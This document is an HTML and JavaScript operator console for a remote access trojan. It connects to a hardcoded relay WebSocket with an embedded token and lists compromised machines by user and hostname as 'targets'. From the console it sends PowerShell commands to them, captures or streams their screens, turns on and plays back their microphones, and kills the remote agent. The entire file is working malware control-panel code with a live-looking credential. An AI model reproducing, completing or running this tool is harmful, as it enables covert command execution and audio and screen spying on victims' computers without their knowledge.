<!doctype html>
<html><head><meta charset="utf-8">
<title>Operator</title>
<style>
  body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
  #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
  #agents{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:6px;min-width:280px}
  #out{background:#000;color:#9f9;border:1px solid #333;padding:8px;height:40vh;overflow:auto;white-space:pre-wrap;font-size:13px}
  #cmd{width:100%;background:#000;color:#fff;border:1px solid #333;padding:8px;font-family:inherit;box-sizing:border-box}
  button{background:#333;color:#fff;border:1px solid #555;padding:6px 10px;cursor:pointer}
  button:hover{background:#444}
  #shot{max-width:100%;border:1px solid #333;margin-top:12px;display:block;background:#000;min-height:40px}
  #status{color:#888;font-size:12px}
  #micwrap{display:flex;gap:6px;align-items:center;margin-top:8px}
  #vu{width:160px;height:10px;background:#222;border:1px solid #333}
  #vu>div{height:100%;width:0%;background:#0f0;transition:width .05s linear}
  #audstat{color:#888;font-size:12px}
</style></head>
<body>
<div id="hdr">
  <button id="connect">connect</button>
  <select id="agents"><option value="">-- pick target --</option></select>
  <button id="shot1">Single Screenshot</button>
  <button id="shot2">Stream ON</button>
  <button id="shot3">Stream OFF</button>
  <button id="mic1">Mic ON</button>
  <button id="mic2">Mic OFF</button>
  <button id="mute">🔇</button>
  <button id="kill">kill</button>
  <span id="status">idle</span>
</div>
<div id="micwrap">
  <span style="color:#888;font-size:12px">mic VU:</span>
  <div id="vu"><div></div></div>
  <span id="audstat">audio: idle</span>
  <span style="color:#888;font-size:12px" id="stats2">chunks:0 played:0 dropped:0 q:0</span>
</div>
<div id="out"></div>
<input id="cmd" placeholder="PowerShell — press Enter to send">
<img id="shot" alt="">
<audio id="aud" autoplay></audio>

<script>
// =========================================================================
// FILL — relay URL and token
// =========================================================================
const RELAY = "wss://operator-nmth.onrender.com/ws";
const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";

// =========================================================================
// DOM
// =========================================================================
const outEl     = document.getElementById('out');
const agentsEl  = document.getElementById('agents');
const shotEl    = document.getElementById('shot');
const statusEl  = document.getElementById('status');
const vuEl      = document.querySelector('#vu > div');
const audstatEl = document.getElementById('audstat');
const stats2El  = document.getElementById('stats2');

// =========================================================================
// State
// =========================================================================
let ws = null;
let attachedId = null;
let frames = 0;
let outs = 0;
let micOn = false;
let muted = false;

// PCM/WAV playback
let pcmChunks = 0;
let pcmPlayed = 0;
let pcmDropped = 0;
let lastPeak = 0;

// Sliding PCM accumulator
const MIC_RATE = 16000;
const MIC_CH   = 1;
const MIC_BITS = 16;
const WINDOW_MS = 250;                         // bundle 250 ms per WAV
const WINDOW_SAMPLES = MIC_RATE * WINDOW_MS / 1000;
let pcmRing = new Int16Array(0);               // rolling samples
const wavQueue = [];                           // pending WAV URLs
let audioEl = document.getElementById('aud');
audioEl.volume = 1.0;

// =========================================================================
// Helpers
// =========================================================================
function log(s){ outEl.textContent += s + "\n"; outEl.scrollTop = outEl.scrollHeight; }
function setStatus(s){ statusEl.textContent = s; }
function refreshStatus(){
  setStatus(`attached:${attachedId||'none'}  frames:${frames}  outs:${outs}  pcm:${pcmChunks}`);
}
function refreshStats2(){
  stats2El.textContent =
    `chunks:${pcmChunks} played:${pcmPlayed} dropped:${pcmDropped} q:${wavQueue.length}`;
}
function b64ToU8(b64){
  const bin = atob(b64);
  const u8 = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; ++i) u8[i] = bin.charCodeAt(i);
  return u8;
}
function u8ToB64(u8){
  let bin = '';
  for (const b of u8) bin += String.fromCharCode(b);
  return btoa(bin);
}

// =========================================================================
// PCM -> WAV blob (RFC 2361 / RIFF)
// =========================================================================
function pcmToWavBlob(pcmBytes, rate, ch, bits){
  const dataLen = pcmBytes.length;
  const buf = new ArrayBuffer(44 + dataLen);
  const view = new DataView(buf);
  const w = (o, s) => { for (let i = 0; i < s.length; i++) view.setUint8(o+i, s.charCodeAt(i)); };
  w(0, 'RIFF');
  view.setUint32(4, 36 + dataLen, true);
  w(8, 'WAVE');
  w(12, 'fmt ');
  view.setUint32(16, 16, true);
  view.setUint16(20, 1, true);                             // PCM
  view.setUint16(22, ch, true);
  view.setUint32(24, rate, true);
  view.setUint32(28, rate * ch * bits / 8, true);          // byte rate
  view.setUint16(32, ch * bits / 8, true);                 // block align
  view.setUint16(34, bits, true);
  w(36, 'data');
  view.setUint32(40, dataLen, true);
  new Uint8Array(buf, 44).set(pcmBytes);
  return new Blob([buf], { type: 'audio/wav' });
}

// =========================================================================
// PCM ring buffer. Push samples; when >= WINDOW_SAMPLES, drain to WAV and queue.
// =========================================================================
function pushPcmIntoRing(b64, rate, ch){
  if (muted) return;
  const bytes = b64ToU8(b64);
  const n = bytes.length >> 1;

  // track peak of the incoming chunk
  let peak = 0;
  for (let i = 0; i < n; i++) {
    let v = bytes[i*2] | (bytes[i*2+1] << 8);
    if (v & 0x8000) v |= ~0xffff;
    const a = (v < 0 ? -v : v) / 32768;
    if (a > peak) peak = a;
  }
  lastPeak = peak;
  if (vuEl) vuEl.style.width = Math.min(100, Math.round(peak * 100)) + '%';

  // append to ring (Int16Array; grow as needed)
  const needed = pcmRing.length + n;
  if (needed > pcmRing.length) {
    const next = new Int16Array(needed);
    next.set(pcmRing, 0);
    pcmRing = next;
  }
  const base = pcmRing.length - n;
  for (let i = 0; i < n; i++) {
    let v = bytes[i*2] | (bytes[i*2+1] << 8);
    if (v & 0x8000) v |= ~0xffff;
    pcmRing[base + i] = v;
  }

  // drain full windows to WAV chunks
  while (pcmRing.length >= WINDOW_SAMPLES) {
    const slice = pcmRing.subarray(0, WINDOW_SAMPLES);
    const bytesOut = new Uint8Array(WINDOW_SAMPLES * 2);
    for (let i = 0; i < WINDOW_SAMPLES; i++) {
      const s = slice[i];
      bytesOut[i*2]   = s & 0xff;
      bytesOut[i*2+1] = (s >> 8) & 0xff;
    }
    const blob = pcmToWavBlob(bytesOut, MIC_RATE, MIC_CH, MIC_BITS);
    const url  = URL.createObjectURL(blob);
    wavQueue.push(url);
    pcmRing = pcmRing.subarray(WINDOW_SAMPLES);
    pcmRing = new Int16Array(pcmRing);   // detach from subarray view

    maybePlayNext();
  }
}

// =========================================================================
// Play the queue back-to-back with a single <audio> element
// =========================================================================
let playing = false;
function maybePlayNext(){
  if (playing || wavQueue.length === 0) return;
  const url = wavQueue.shift();
  audioEl.src = url;
  audioEl.onended = () => {
    URL.revokeObjectURL(url);
    playing = false;
    maybePlayNext();
  };
  audioEl.onerror = () => {
    URL.revokeObjectURL(url);
    playing = false;
    maybePlayNext();
  };
  audioEl.play().then(() => {
    playing = true;
    pcmPlayed++;
    refreshStats2();
  }).catch(err => {
    // autoplay blocked — flip a hint in the UI
    audstatEl.textContent = 'audio: blocked (' + (err && err.name || 'unknown') + ')';
    URL.revokeObjectURL(url);
    playing = false;
    setTimeout(maybePlayNext, 250);
  });
  audstatEl.textContent = 'audio: playing';
}

// Priming: any click on the page unlocks autoplay via the audio element.
window.addEventListener('pointerdown', () => {
  audioEl.play().catch(()=>{});
}, true);

// =========================================================================
// Connect
// =========================================================================
document.getElementById('connect').onclick = () => {
  setStatus('connecting…');
  ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
  ws.onopen = () => {
    setStatus('connected');
    log("[ws] connected");
    ws.send(JSON.stringify({op:'list'}));
  };
  ws.onclose = (e) => {
    setStatus('closed ' + (e.code || ''));
    log("[ws] closed " + (e.code || '') + ' ' + (e.reason || ''));
  };
  ws.onerror = () => { setStatus('error'); log("[ws] error"); };

  ws.onmessage = (ev) => {
    let m; try { m = JSON.parse(ev.data); } catch { return; }

    if (m.op === 'agents') {
      const cur = agentsEl.value;
      agentsEl.innerHTML = '<option value="">-- pick target --</option>';
      for (const a of (m.list || [])) {
        const o = document.createElement('option');
        o.value = a.id;
        o.textContent = `${a.id}  (${a.info?.user || '?'}@${a.info?.hostname || '?'})`;
        agentsEl.appendChild(o);
      }
      if (cur) agentsEl.value = cur;
      refreshStatus();

    } else if (m.op === 'attached') {
      attachedId = m.id;
      log(`[attach] ${m.id}`);
      refreshStatus();

    } else if (m.op === 'err') {
      log(`[err] ${m.reason}`);

    } else if (m.op === 'out') {
      outs++;
      try {
        const u8 = b64ToU8(m.data);
        log(new TextDecoder().decode(u8));
      } catch (e) { log("[out decode err] " + e.message); }
      refreshStatus();

    } else if (m.op === 'log') {
      log(`[agent] ${m.msg}`);

    } else if (m.op === 'frame') {
      frames++;
      shotEl.src = 'data:image/jpeg;base64,' + m.data;
      refreshStatus();

    } else if (m.op === 'pcm') {
      pcmChunks++;
      if (!micOn) return;
      pushPcmIntoRing(m.data, m.rate || MIC_RATE, m.ch || MIC_CH);
      if ((pcmChunks % 25) === 0) refreshStats2();
    }
  };
};

// =========================================================================
// Attach
// =========================================================================
agentsEl.onchange = () => {
  attachedId = agentsEl.value || null;
  if (attachedId && ws && ws.readyState === 1) {
    ws.send(JSON.stringify({op:'attach', id: attachedId}));
  }
  refreshStatus();
};

// =========================================================================
// Command
// =========================================================================
document.getElementById('cmd').addEventListener('keydown', (e) => {
  if (e.key !== 'Enter') return;
  const text = e.target.value; e.target.value = '';
  if (!text) return;
  if (!attachedId) { log("[no target]"); return; }
  if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
  const u8 = new TextEncoder().encode(text);
  ws.send(JSON.stringify({op:'in', data: u8ToB64(u8)}));
  log("> " + text);
});

// =========================================================================
// Screenshot
// =========================================================================
document.getElementById('shot1').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshotOnce'}));
  log("[shot] single requested");
};
document.getElementById('shot2').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshot', on:true}));
  log("[shot] stream ON");
};
document.getElementById('shot3').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  ws.send(JSON.stringify({op:'screenshot', on:false}));
  log("[shot] stream OFF");
};

// =========================================================================
// Mic — pack-and-play. No AudioContext. Pure WAV blob queue.
// =========================================================================
document.getElementById('mic1').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  pcmRing = new Int16Array(0);
  wavQueue.length = 0;
  // unlock autoplay with a real gesture
  audioEl.play().catch(()=>{});
  micOn = true;
  ws.send(JSON.stringify({op:'mic', on:true}));
  audstatEl.textContent = 'audio: armed';
  log("[mic] ON — packing WAVs, " + WINDOW_MS + " ms per chunk");
};

document.getElementById('mic2').onclick = () => {
  if (!attachedId || !ws) { log("[no target]"); return; }
  micOn = false;
  ws.send(JSON.stringify({op:'mic', on:false}));
  log("[mic] OFF");
};

document.getElementById('mute').onclick = () => {
  muted = !muted;
  document.getElementById('mute').textContent = muted ? '🔊' : '🔇';
  if (muted) { audioEl.pause(); audioEl.src = ''; wavQueue.length = 0; }
  if (vuEl) vuEl.style.width = '0%';
};

// =========================================================================
// Kill
// =========================================================================
document.getElementById('kill').onclick = () => {
  if (!attachedId || !ws) return;
  ws.send(JSON.stringify({op:'kill'}));
  log("[kill] sent");
};

// debug
window.__dbg = function(){
  return {
    micOn, muted,
    pcmChunks, pcmPlayed, pcmDropped,
    lastPeak: lastPeak.toFixed(3),
    ringSamples: pcmRing.length,
    queue: wavQueue.length,
    playing,
    audioSrcLen: audioEl.src.length,
    audioPaused: audioEl.paused,
    audioReadyState: audioEl.readyState
  };
};
</script>
</body></html>
